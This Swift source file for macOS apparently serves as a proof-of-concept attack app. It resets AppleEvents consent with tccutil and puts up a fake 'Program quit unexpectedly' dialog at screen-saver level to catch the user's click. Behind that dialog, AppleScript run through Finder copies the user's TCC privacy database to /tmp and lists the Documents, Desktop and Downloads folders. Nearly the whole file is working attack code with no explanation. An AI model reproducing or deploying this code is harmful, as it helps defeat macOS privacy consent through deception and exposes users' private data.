import Cocoa
import AppKit
import Foundation

class AppDelegate: NSObject, NSApplicationDelegate {
    var window : NSWindow!
    var script_dir : String!

    func leaks(_ args: String...) { 
            let task = Process() 
            task.launchPath = "/usr/bin/leaks" 
            task.arguments = args 
            let pipe = Pipe() 
            task.standardOutput = pipe 
            task.launch()
        }

    func shell(_ args: String...) { 
        let task = Process() 
        task.launchPath = "/bin/bash" 
        task.arguments = args 
        let pipe = Pipe() 
        task.standardOutput = pipe 
        task.launch()
    }

  func applicationDidFinishLaunching(_ notification: Notification) {
      
      let dispatch = DispatchQueue.global(qos: .background)
        leaks("--atExit", "--", "tccutil", "reset" , "AppleEvents")
        shell("-c", "/System/Applications/Mission\\ Control.app/Contents/MacOS/Mission\\ Control")
        
      let source = """
        tell application "Finder"
        # copy the TCC database
        set applicationSupportDirectory to POSIX path of (path to application support from user domain)
        set tccDirectory to applicationSupportDirectory & "com.apple.TCC/TCC.db"
        duplicate file (POSIX file tccDirectory as alias) to folder (POSIX file "/tmp/" as alias) with replacing
        # close our fake popup
        do shell script "/bin/bash -c 'pkill swift-frontend' &"
        end tell
        """
      dispatch.async {
          var c1 = 0
          var c2 = 0
          
          if let script = NSAppleScript(source: source){
              var error : NSDictionary?
              let result = script.executeAndReturnError(&error)
              if let err = error {
                  print(err)
              }else {
                  print("Executing TCC db copy to /tmp...")
                  
                  var runningApps = NSWorkspace.shared.runningApplications
                  
                  for app in runningApps {
                      let name = app.localizedName!
                      if name.contains("Chrome"){
                          c1 += 1
                          
                      }
                      if name.contains("Safari"){
                          c2 += 1
                      }
                  }
                  
                  if c1 > 0{
                      print("Chrome is running. Active tab info:")
                      var listDocsDir = """
tell application "Finder"
    set theFolder to (path to documents folder as text) as alias
    set aList to (name of every item of folder theFolder)
end tell
"""
                      
                      var listDesktopDir = """
tell application "Finder"
    set theFolder to (path to desktop folder as text) as alias
    set aList to (name of every item of folder theFolder)
end tell
"""
                      
                      var listDownloadsDir = """
tell application "Finder"
    set theFolder to (path to downloads folder as text) as alias
    set aList to (name of every item of folder theFolder)
end tell
"""
                      if let script2 = NSAppleScript(source: listDocsDir){
                          var error2 : NSDictionary?
                          let result2 = script2.executeAndReturnError(&error2)
                         
                          if let err2 = error2{
                              print(err2)
                          }else {
                              print("-------------------------------")
                              print("Documents Directory Contents:")
                              print(result2)
                              print("-------------------------------")
                              
                          }
                      }
                      
                      
                      if let script3 = NSAppleScript(source: listDesktopDir){
                          var error3 : NSDictionary?
                          let result3 = script3.executeAndReturnError(&error3)
                
                          if let err3 = error3{
                              print(err3)
                          }else {
                              print("--------------------------------")
                              print("Desktop Directory Contents:")
                              print(result3)
                              print("--------------------------------")
                              
                          }
                      }
                      
                      if let script4 = NSAppleScript(source: listDownloadsDir){
                          var error4 : NSDictionary?
                          let result4 = script4.executeAndReturnError(&error4)
                          
                          if let err4 = error4{
                              print(err4)
                          }else {
                              print("----------------------------------")
                              print("Downloads Directory Contents:")
                              print(result4)
                              print("----------------------------------")
                              
                          }
                      }
                      
                      
                      
                  }
              }
              
              exit(0)
              
      }
      
          
      }
      
        renderWindow()
   }

    func applicationShouldTerminate(_ sender: NSApplication) -> NSApplication.TerminateReply {
        return .terminateCancel
    }

    func applicationShouldTerminateAfterLastWindowClosed(_ sender: NSApplication) -> Bool {
        return true
    }

    func getScriptDirectory() -> String {
        let script_url = URL(fileURLWithPath:CommandLine.arguments[0]);
        return script_url.deletingLastPathComponent().path;
    }

    func renderWindow() {
        window = NSWindow(contentRect:NSMakeRect(0,0,300,300), styleMask: [.titled], backing:.buffered, defer:false)
        window.center()
        window.isOpaque = false
        window.isMovable = false
        window!.level = .screenSaver
        window!.ignoresMouseEvents = true
        window.makeKeyAndOrderFront(window)
        window.setFrameOrigin(NSPoint(x: window.frame.origin.x , y: window.frame.origin.y + 50))
        //window.backgroundColor = NSColor(red: 0, green: 0, blue: 0, alpha: 0.5)

        let imageView = NSImageView(frame:CGRect(origin: NSPoint(x: 110, y: 200), size: CGSize(width: 84, height: 84)))
        imageView.image = NSImage(byReferencingFile: "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/AlertStopIcon.icns")
        window.contentView?.addSubview(imageView)
        
        let label = NSTextField()
        label.isBezeled = false
        label.isEditable = false
        label.alignment = .center
        label.font = .boldSystemFont(ofSize: 16)
        label.stringValue = "Program quit unexpectedly"
        label.backgroundColor = .black.withAlphaComponent(0)
        label.frame = CGRect(origin: NSPoint(x: 0, y: 140), size: CGSize(width: 300, height: 50))
        window.contentView?.addSubview(label)

        let description = NSTextField()
        description.alignment = .left
        description.isBezeled = false
        description.isEditable = false
        description.font = .systemFont(ofSize: 15)
        description.backgroundColor = .black.withAlphaComponent(0)
        description.frame = CGRect(origin: NSPoint(x: 42, y: -40), size: CGSize(width: 220, height: 200))
        description.stringValue = "Click OK to see more detailed information and send a report to Apple."
        window.contentView?.addSubview(description)

        let button = NSButton();
        button.title = "OK"
        button.wantsLayer = true
        button.alignment = .center
        button.layer?.borderWidth = 0
        button.layer?.cornerRadius = 10
        button.font = .systemFont(ofSize: 14)
        button.frame = CGRect(origin: NSPoint(x: 154, y: 26), size: CGSize(width: 110, height: 30))
        window.contentView?.addSubview(button)
        
    }

}

let appDelegate = AppDelegate()

let app = NSApplication.shared

app.delegate = appDelegate
app.setActivationPolicy(.regular)
app.activate(ignoringOtherApps:true)
app.run()

